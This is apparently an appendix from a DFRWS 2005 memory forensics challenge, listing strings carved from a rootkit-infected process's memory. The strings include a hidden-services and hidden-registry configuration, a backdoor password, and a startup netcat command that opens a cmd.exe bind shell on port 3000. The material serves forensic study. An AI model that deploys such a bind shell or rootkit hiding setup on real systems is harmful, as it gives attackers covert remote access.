000DFED8 000DFED8         C:\WINNT\system32\cmd.exe
000DFF00 000DFF00         C:\WINNT\system32\
000DFF20 000DFF20         %sysdir%
000DFF38 000DFF38         C:\WINNT\System32\
000DFF58 000DFF58         %windir%
000DFF70 000DFF70         C:\WINNT\
000DFF88 000DFF88         %tmpdir%
000DFFA0 000DFFA0         C:\WINNT\TEMP\
000DFFBC 000DFFBC         /[/H/idd\en Ser:vi"c$
000DFFE0 000DFFE0         [Hidden ServicesD
000E0000 000E0000         [Hidden Servicesd
000E0020 000E0020         [HIDDEN SERVICES
000E0040 000E0040         D>:FR"W/
000E0094 000E0094         
000E00AC 000E00AC
000E00C4 000E00C4         [Hi:ddenR/">>egKeys,
000E00E8 000E00E8         [Hidden RegKeys]L
000E0108 000E0108         [Hidden RegKeys]l
000E0128 000E0128         [HIDDEN REGKEYS]
000E0148 000E0148         D:"FR<WS2\00
000E0164 000E0164         DFRWS200
000E017C 000E017C         DFRWS200
000E0194 000E0194         DFRWS200
000E01AC 000E01AC         LE":GACY_D\FRWS2\005
000E01D0 000E01D0         LEGACY_DFRWS20054
000E01F0 000E01F0         LEGACY_DFRWS2005T
000E0210 000E0210         LEGACY_DFRWS2005t
000E0230 000E0230         D:FR:WSDRV/2
000E024C 000E024C         DFRWSDRV2005
000E0268 000E0268         DFRWSDRV2005
000E0284 000E0284         DFRWSDRV2005
000E02A0 000E02A0         LE":GACY_DF\RWSDR/V20\05
000E02C8 000E02C8         LEGACY_DFRWSDRV2,
000E02E8 000E02E8         LEGACY_DFRWSDRV2L
000E0308 000E0308         LEGACY_DFRWSDRV2l
000E0328 000E0328         
000E0344 000E0344         
000E0360 000E0360         \"[Hid:den\>:RegValues]
000E0388 000E0388         [Hidden RegValue
000E03A8 000E03A8         [Hidden RegValue
000E03C8 000E03C8         [HIDDEN REGVALUE,
000E03E8 000E03E8         ///L
000E0408 000E0408         h
000E0424 000E0424         :[St/\artup\Run
000E0444 000E0444         [Startup Run]
000E0460 000E0460         [Startup Run]
000E047C 000E047C         [STARTUP RUN]
000E0498 000E0498         "c:\winnt\system32\nc.exe" 
                          -L-p 3000 -t -e cmd.exe
000E04D8 000E04D8         c:\winnt\system32\nc.exe?-L -p 
                          3000 -t -e cmd.ex@
000E0518 000E0518         c:\winnt\system32\nc.exe
000E0540 000E0540         -L -p 3000 -t -e cmd.exe
Appendix 2: Selected Strings from Image 1:PID 668 (UMGR32.exe)
Starting Image 2 Dump Address: 05549B98
Starting Process Memory Address: 0014DB98

Process Page-in       String
Dump Address
0001EB98 0001EB98         0 [H<<<iddenT>>a/"ble]

0001EBAF 0001EBAF         0 >d"frws"*
0001EBBA 0001EBBA         0 r|c<md\.ex<e::
0001EBCA 0001EBCA         0 e<og|han
0001EBD4 0001EBD4         0 um\gr|32.e<xe
0001EBE5 0001EBE5         0 "[:\:R:o:o\:t::P:r>:o:c<
                          :e:s:s:e<:s:>]
0001EC0E 0001EC0E         0 d<r>f<w>:s<*
0001EC1C 0001EC1C         0 <\r\c:\m\d.\e\x\e
0001EC2F 0001EC2F         0 <n|c.ex\e
0001EC3C 0001EC3C         0 /[/H/idd\en Ser:vi"ces]
0001EC55 0001EC55         0 D>:FR"W//S*
0001EC62 0001EC62         0                   /
0001EC6D 0001EC6D         0 [Hi:ddenR/">>egKeys]
0001EC84 0001EC84         0 D:"FR<WS2\00/5
0001EC94 0001EC94         0 LE":GACY_D\FRWS2\005
0001ECAA 0001ECAA         0 D:FR:WSDRV/2005
0001ECBB 0001ECBB         0 LE":GACY_DF\RWSDR/V20\05
0001ECD5 0001ECD5         0                            /
0001ECE4 0001ECE4         0 \"[Hid:den\>:RegValues]"""
0001ED01 0001ED01         0           ////
0001ED14 0001ED14         0 :[St/\artup\ Run/]
0001ED28 0001ED28         0 c:\winnt\system32\nc.exe?-L -p 3000 -t -ecmd.exe
0001ED5D 0001ED5D         0 ":[\Fr<ee>>S:"<pa>ce]
0001ED77 0001ED77         0 "[>H<i>d"d:en<>\P/:or:
                          t<s"]\:
0001ED97 0001ED97         0 TCP:1313,3000
0001EDA8 0001EDA8         0 [Set/tin/:\gs]/
0001EDBB 0001EDBB         0 P:assw\ord=dfrws2005
0001EDD1 0001EDD1         0 Ba:ckd:"oor"Shell=dfrws
0001EDE9 0001EDE9         0 $.exe
0001EDF0 0001EDF0         0 Fil:eMappin\gN/ame=_.-=[DFRWS2005]=-._
0001EE18 0001EE18         0 Serv:iceName=DFRWS2005
0001EE30 0001EE30         0 >Se|rvi:ceDisp<://la"yName=
                          DFRWS2005 Challenge
0001EE60 0001EE60         0 Ser>vic:eD||escr<ip:t"ion=memory 
                          examination challenge
0001EE98 0001EE98         0 Dri<ve\rN:ame=DFRWSDRV2005
0001EEB4 0001EEB4         0 D:riv>erFileNam/e=dfrwsdrv.sys
0001EED4 0001EED4         0                            
0001EEE2 0001EEE2         0 [Comments]
0001EF00 0001EF00         0 [H<<<iddenT>>a/"ble]
0001EF17 0001EF17         0 >d"frws"*
0001EF22 0001EF22         0 r|c<md\.ex<e::
0001EF32 0001EF32         0 e<og|han
0001EF3C 0001EF3C         0 um\gr|32.e<xe
0001EF4D 0001EF4D         0 "[:\:R:o:o\:t::P:r>:o:c<
                          :e:s:s:e<:s:>]
0001EF76 0001EF76         0 d<r>f<w>:s<*
0001EF84 0001EF84         0 <\r\c:\m\d.\e\x\e
0001EF97 0001EF97         0 <n|c.ex\e
0001EFA4 0001EFA4         0 /[/H/idd\en Ser:vi"ces]
0001EFBD 0001EFBD         0 D>:FR"W//S*
0001EFCA 0001EFCA         0                   /
0001EFD5 0001EFD5         0 [Hi:ddenR/">>egKeys]
0001EFEC 0001EFEC         0 D:"FR<WS2\00/5
0001EFFC 0001EFFC         0 LE":GACY_D\FRWS2\005
0001F012 0001F012         0 D:FR:WSDRV/2005
0001F023 0001F023         0 LE":GACY_DF\RWSDR/V20\05
0001F03D 0001F03D         0                            /
0001F04C 0001F04C         0 \"[Hid:den\>:RegValues]"""
0001F069 0001F069         0           ////
0001F07C 0001F07C         0 :[St/\artup\ Run/]
0001F090 0001F090         0 c:\winnt\system32\nc.exe?-L -p 3000 -t -ecmd.exe
0001F0C5 0001F0C5         0 ":[\Fr<ee>>S:"<pa>ce]
0001F0DF 0001F0DF         0 "[>H<i>d"d:en<>\P/:or:
                          t<s"]\:
0001F0FF 0001F0FF         0 TCP:1313,3000
0001F110 0001F110         0 [Set/tin/:\gs]/
0001F123 0001F123         0 P:assw\ord=dfrws2005
0001F139 0001F139         0 Ba:ckd:"oor"Shell=dfrws
0001F151 0001F151         0 $.exe
0001F158 0001F158         0 Fil:eMappin\gN/ame=_.-=[DFRWS2005]=-._
0001F180 0001F180         0 Serv:iceName=DFRWS2005
0001F198 0001F198         0 >Se|rvi:ceDisp<://la"yName=
                          DFRWS2005 Challenge
0001F1C8 0001F1C8         0 Ser>vic:eD||escr<ip:t"ion=memory 
                          examination challenge
0001F200 0001F200         0 Dri<ve\rN:ame=DFRWSDRV2005
0001F21C 0001F21C         0 D:riv>erFileNam/e=dfrwsdrv.sys
0001F23C 0001F23C         0                            
0001F24A 0001F24A         0 [Comments]
0001F264 0001F264         0 <iddenT>>a/"ble]
0001F277 0001F277         0 >d"frws"*
0001F282 0001F282         0 r|c<md\.ex<e::
0001F292 0001F292         0 e<og|han
0001F29C 0001F29C         0 um\gr|32.e<xe
0001F2AD 0001F2AD         0 "[:\:R:o:o\:t::P:r>:o:
                          c<:e:s:s:e<:s:>]
0001F2D6 0001F2D6         0 d<r>f<w>:s<*
0001F2E4 0001F2E4         0 <\r\c:\m\d.\e\x\e
0001F2F7 0001F2F7         0 <n|c.ex\e
0001F304 0001F304         0 /[/H/idd\en Ser:vi"ces]
0001F31D 0001F31D         0 D>:FR"W//S*
0001F32A 0001F32A         0                   /
0001F335 0001F335         0 [Hi:ddenR/">>egKeys]
0001F34C 0001F34C         0 D:"FR<WS2\00/5
0001F35C 0001F35C         0 LE":GACY_D\FRWS2\005
0001F372 0001F372         0 D:FR:WSDRV/2005
0001F383 0001F383         0 LE":GACY_DF\RWSDR/V20\05
0001F39D 0001F39D         0                            /
0001F3AC 0001F3AC         0 \"[Hid:den\>:RegValues]"""
0001F3C9 0001F3C9         0           ////
0001F3DC 0001F3DC         0 :[St/\artup\ Run/]
0001F3F0 0001F3F0         0 c:\winnt\system32\nc.exe?-L -p 3000 -t -e cmd.exe
0001F425 0001F425         0 ":[\Fr<ee>>S:"<pa>ce]
0001F43F 0001F43F         0 "[>H<i>d"d:en<>\ 
                          P/:or:t<s"]\:
0001F45F 0001F45F         0 TCP:1313,3000
0001F470 0001F470         0 [Set/tin/:\gs]/
0001F483 0001F483         0 P:assw\ord=dfrws2005
0001F499 0001F499         0 Ba:ckd:"oor"Shell=dfrws
0001F4B1 0001F4B1         0 $.exe
0001F4B8 0001F4B8         0 Fil:eMappin\gN/ame=_.-=[DFRWS2005]=-._
0001F4E0 0001F4E0         0 Serv:iceName=DFRWS2005
0001F4F8 0001F4F8         0 >Se|rvi:ceDisp<://la"yName=
                          DFRWS2005 Challenge
0001F528 0001F528         0 Ser>vic:eD||escr<ip:t"ion=memory 
                          examination challenge
0001F560 0001F560         0 Dri<ve\rN:ame=DFRWSDRV2005
0001F57C 0001F57C         0 D:riv>erFileNam/e=dfrwsdrv.sys
0001F59C 0001F59C         0                            
0001F5AA 0001F5AA         0 [Comments]
```
